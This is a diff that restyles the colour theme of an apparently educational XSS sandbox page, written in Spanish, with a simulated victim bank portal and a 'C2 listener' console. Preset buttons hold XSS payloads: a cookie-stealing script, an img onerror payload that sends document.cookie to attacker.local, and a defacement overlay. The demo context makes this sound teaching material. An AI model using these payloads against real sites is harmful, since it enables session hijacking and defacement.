@@ -8,7 +8,7 @@ import Layout from '../../layouts/Layout.astro';
     <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-cyber-border/80 pb-5">
       <div>
         <h1 class="text-2xl sm:text-3xl font-bold font-mono text-white flex items-center gap-3">
-          <span class="p-2 rounded-lg bg-cyber-glow/10 border border-cyber-glow/30 text-cyber-glow">
+          <span class="p-2 rounded-lg bg-cyber-purple/20 border border-cyber-accent/40 text-cyber-pastelPink shadow-neon-purple/20">
             <svg class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
           </span>
           Sandbox Seguro & Servidor de Exfiltración
@@ -19,7 +19,7 @@ import Layout from '../../layouts/Layout.astro';
       </div>
 
       <div class="flex items-center gap-2">
-        <button id="reset-sandbox-btn" class="px-3 py-1.5 rounded-lg bg-cyber-panel hover:bg-cyber-card border border-cyber-border text-slate-300 hover:text-white text-xs font-mono transition-all">
+        <button id="reset-sandbox-btn" class="px-3 py-1.5 rounded-lg bg-cyber-panel hover:bg-cyber-card border border-cyber-border text-slate-300 hover:text-cyber-pastelPink text-xs font-mono transition-all">
           Reiniciar Sandbox
         </button>
       </div>
@@ -32,7 +32,7 @@ import Layout from '../../layouts/Layout.astro';
         <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-4">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2">
-              <span class="w-2.5 h-2.5 rounded-full bg-cyber-accent"></span>
+              <span class="w-2.5 h-2.5 rounded-full bg-cyber-pink"></span>
               <span class="text-xs font-mono font-bold text-white uppercase">Editor de Carga Maliciosa</span>
             </div>
             <span class="text-[10px] font-mono text-slate-400">Sandbox Iframe Aislado</span>
@@ -42,7 +42,7 @@ import Layout from '../../layouts/Layout.astro';
             <textarea
               id="sandbox-payload-input"
               rows="6"
-              class="w-full p-3 rounded-lg bg-cyber-bg border border-cyber-border font-mono text-xs text-cyber-accent focus:border-cyber-accent focus:outline-none resize-none leading-relaxed"
+              class="w-full p-3 rounded-lg bg-cyber-bg border border-cyber-border font-mono text-xs text-cyber-pastelPink focus:border-cyber-pink focus:outline-none resize-none leading-relaxed"
               placeholder="Escribe aquí tu payload..."
             >&lt;script&gt;
   const cookie = document.cookie;
@@ -53,14 +53,14 @@ import Layout from '../../layouts/Layout.astro';
 
           <div class="flex flex-wrap items-center justify-between gap-2 pt-1">
             <div class="flex flex-wrap gap-1.5">
-              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<script>alert('Cookie: ' + document.cookie)</script>">Robo Cookie</button>
-              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<img src=x onerror=&quot;fetch('http://attacker.local/log?c=' + encodeURIComponent(document.cookie))&quot;>">Exfiltrar HTTP</button>
-              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;display:flex;align-items:center;justify-content:center;font-size:24px;'>HACKEADO (Defacement)</div>">Defacement</button>
+              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-cyber-pastelPink text-[11px] font-mono border border-cyber-border/60" data-code="<script>alert('Cookie: ' + document.cookie)</script>">Robo Cookie</button>
+              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-cyber-pastelPink text-[11px] font-mono border border-cyber-border/60" data-code="<img src=x onerror=&quot;fetch('http://attacker.local/log?c=' + encodeURIComponent(document.cookie))&quot;>">Exfiltrar HTTP</button>
+              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-cyber-pastelPink text-[11px] font-mono border border-cyber-border/60" data-code="<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:purple;color:white;display:flex;align-items:center;justify-content:center;font-size:24px;'>HACKEADO (Defacement)</div>">Defacement</button>
             </div>
 
             <button
               id="execute-sandbox-btn"
-              class="px-4 py-2 rounded-lg bg-cyber-accent hover:bg-emerald-400 text-black font-mono font-bold text-xs transition-all shadow-neon-green/20"
+              class="px-4 py-2 rounded-lg bg-gradient-to-r from-cyber-purple to-cyber-pink hover:opacity-90 text-black font-mono font-bold text-xs transition-all shadow-neon-pink"
             >
               Inyectar en Sandbox
             </button>
@@ -71,17 +71,17 @@ import Layout from '../../layouts/Layout.astro';
           <div class="flex items-center justify-between">
             <span class="text-xs font-mono font-bold text-white uppercase">Vista Previa del Navegador Víctima</span>
             <div class="flex items-center gap-2">
-              <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-              <span class="text-[10px] font-mono text-emerald-300">target-app.internal</span>
+              <span class="w-2 h-2 rounded-full bg-cyber-pink animate-pulse"></span>
+              <span class="text-[10px] font-mono text-cyber-pastelPink">target-app.internal</span>
             </div>
           </div>
 
           <div class="rounded-lg border border-cyber-border/80 overflow-hidden bg-white">
-            <div class="bg-slate-800 px-3 py-1.5 flex items-center justify-between border-b border-slate-700 text-[11px] font-mono text-slate-400">
+            <div class="bg-slate-900 px-3 py-1.5 flex items-center justify-between border-b border-slate-800 text-[11px] font-mono text-slate-400">
               <div class="flex items-center gap-1.5">
                 <span class="w-2.5 h-2.5 rounded-full bg-red-500 inline-block"></span>
                 <span class="w-2.5 h-2.5 rounded-full bg-amber-500 inline-block"></span>
-                <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 inline-block"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-cyber-accent inline-block"></span>
                 <span class="ml-2 text-slate-300 font-sans">https://portal.bank-secure.local/dashboard</span>
               </div>
             </div>
@@ -102,16 +102,16 @@ import Layout from '../../layouts/Layout.astro';
         <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-4">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2">
-              <span class="w-2.5 h-2.5 rounded-full bg-cyber-glow"></span>
+              <span class="w-2.5 h-2.5 rounded-full bg-cyber-accent"></span>
               <span class="text-xs font-mono font-bold text-white uppercase">Datos Sensibles Simulados de la Víctima</span>
             </div>
-            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-panel text-cyber-glow border border-cyber-glow/30">Contexto Aislado</span>
+            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-panel text-cyber-pastelPink border border-cyber-purple/40">Contexto Aislado</span>
           </div>
 
           <div class="grid grid-cols-1 gap-2.5 font-mono text-xs">
             <div class="p-2.5 rounded bg-cyber-bg border border-cyber-border/80">
               <div class="text-[10px] text-slate-500 uppercase">document.cookie:</div>
-              <div class="text-cyber-glow font-bold text-[11px] break-all">session_token=AUTH_SEC_ADMIN_99218274; user=admin_master; role=superadmin</div>
+              <div class="text-cyber-pastelPink font-bold text-[11px] break-all">session_token=AUTH_SEC_ADMIN_99218274; user=admin_master; role=superadmin</div>
             </div>
             <div class="p-2.5 rounded bg-cyber-bg border border-cyber-border/80">
               <div class="text-[10px] text-slate-500 uppercase">window.localStorage:</div>
@@ -123,7 +123,7 @@ import Layout from '../../layouts/Layout.astro';
         <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-3">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2">
-              <span class="w-2.5 h-2.5 rounded-full bg-cyber-danger animate-pulse"></span>
+              <span class="w-2.5 h-2.5 rounded-full bg-cyber-pink animate-pulse"></span>
               <span class="text-xs font-mono font-bold text-white uppercase">Interceptor de Eventos & Exfiltración (C2 Listener)</span>
             </div>
             <button id="clear-interceptor-btn" class="text-[11px] font-mono text-slate-400 hover:text-red-400">
@@ -131,7 +131,7 @@ import Layout from '../../layouts/Layout.astro';
             </button>
           </div>
 
-          <div id="interceptor-console" class="p-3 rounded-lg bg-black/90 border border-cyber-border/90 font-mono text-xs min-h-[220px] max-h-[280px] overflow-y-auto space-y-2 text-slate-300">
+          <div id="interceptor-console" class="p-3 rounded-lg bg-black/95 border border-cyber-border/90 font-mono text-xs min-h-[220px] max-h-[280px] overflow-y-auto space-y-2 text-slate-300">
             <div class="text-slate-500 text-[11px] italic">
               [LISTENER] Escuchando ejecuciones del sandbox...
             </div>
@@ -207,9 +207,9 @@ import Layout from '../../layouts/Layout.astro';
     const entry = document.createElement('div');
     entry.className = 'p-2 rounded border text-[11px] font-mono flex flex-col gap-1 ' + (
       type === 'alert' ? 'bg-red-950/60 border-red-500/60 text-red-300' :
-      type === 'fetch' ? 'bg-amber-950/60 border-amber-500/60 text-amber-300' :
+      type === 'fetch' ? 'bg-purple-950/60 border-cyber-pink/60 text-cyber-pastelPink' :
       type === 'error' ? 'bg-slate-900 border-slate-700 text-slate-400' :
-      'bg-cyan-950/60 border-cyan-500/60 text-cyan-300'
+      'bg-purple-950/40 border-cyber-purple/60 text-cyber-accent'
     );
 
     entry.innerHTML = `
